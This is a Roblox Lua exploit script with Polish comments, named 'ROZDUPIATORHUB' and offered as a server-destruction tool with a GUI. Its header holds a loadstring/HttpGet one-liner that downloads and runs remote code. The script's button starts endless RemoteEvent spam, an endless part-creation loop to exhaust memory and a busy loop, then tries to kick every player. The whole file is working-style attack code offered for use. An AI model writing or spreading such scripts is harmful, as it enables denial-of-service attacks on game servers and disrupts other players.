--[[
    Link do uruchomienia:
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Plakalhub/rozdupiator/refs/heads/main/PlakalHub.lua'))()

    ROZDUPIATORHUB – niszczenie serwera z GUI
]]

-- tworzenie GUI
local gui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local button = Instance.new("TextButton")

gui.Name = "RozdupiatorGUI"
gui.Parent = game.CoreGui

frame.Name = "Frame"
frame.Parent = gui
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- białe tło
frame.BorderColor3 = Color3.fromRGB(0, 0, 0) -- czarny kontur
frame.BorderSizePixel = 3
frame.Position = UDim2.new(0.4, 0, 0.4, 0)
frame.Size = UDim2.new(0, 200, 0, 60)
frame.Active = true
frame.Draggable = true

button.Name = "ZniszczSerwer"
button.Parent = frame
button.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- czerwony
button.BorderColor3 = Color3.fromRGB(0, 0, 0)
button.BorderSizePixel = 2
button.Size = UDim2.new(0, 180, 0, 40)
button.Position = UDim2.new(0, 10, 0, 10)
button.Text = "Zniszcz Serwer"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextSize = 18
button.Font = Enum.Font.SourceSansBold

-- funkcje ataku
local function spamZdalne()
    local repStorage = game:GetService("ReplicatedStorage")
    for _, obiekt in ipairs(repStorage:GetChildren()) do
        if obiekt:IsA("RemoteEvent") or obiekt:IsA("RemoteFunction") then
            spawn(function()
                while true do
                    pcall(function()
                        obiekt:FireServer("CRASH_DATA")
                    end)
                end
            end)
        end
    end
end

local function wyciekPamieci()
    local czesci = {}
    while true do
        local czesc = Instance.new("Part")
        czesc.Name = "WYCIEK_" .. tostring(#czesci)
        czesc.Parent = workspace
        table.insert(czesci, czesc)
    end
end

local function zapetlenie()
    local x = 0
    while true do
        x = x + 1
        if x > 1e9 then x = 0 end
    end
end

local function zniszczSerwer()
    spawn(spamZdalne)
    spawn(wyciekPamieci)
    spawn(zapetlenie)
    task.wait(0.5)
    spawn(function()
        while true do
            for _, gracz in ipairs(game.Players:GetPlayers()) do
                pcall(function()
                    gracz:Kick("Serwer zniszczony przez ROZDUPIATORHUB")
                end)
            end
            task.wait(0.1)
        end
    end)
end

button.MouseButton1Click:Connect(zniszczSerwer)
